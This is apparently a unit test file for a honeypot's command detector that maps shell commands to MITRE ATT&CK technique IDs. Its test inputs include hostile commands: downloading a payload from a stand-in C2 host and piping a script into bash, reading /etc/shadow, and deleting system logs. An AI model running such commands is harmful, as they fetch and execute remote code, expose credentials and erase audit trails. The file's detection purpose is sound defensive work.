"""Unit tests for MITRE ATT&CK command classification."""

from mirage_pot.detector import classify_command


def test_system_info_discovery():
    tech = classify_command("uname -a")
    assert tech is not None
    assert tech.technique_id == "T1082"


def test_user_discovery():
    tech = classify_command("whoami")
    assert tech is not None
    assert tech.technique_id == "T1033"


def test_tool_transfer():
    tech = classify_command("wget http://c2.evil/bot.bin -O /tmp/bot")
    assert tech is not None
    assert tech.technique_id == "T1105"

    tech_curl = classify_command("curl -s http://c2.evil/pay.sh | bash")
    assert tech_curl is not None
    assert tech_curl.technique_id == "T1105"


def test_credential_dumping():
    tech = classify_command("cat /etc/shadow")
    assert tech is not None
    assert tech.technique_id == "T1003"


def test_indicator_removal():
    tech = classify_command("rm -rf /var/log/*")
    assert tech is not None
    assert tech.technique_id == "T1070"
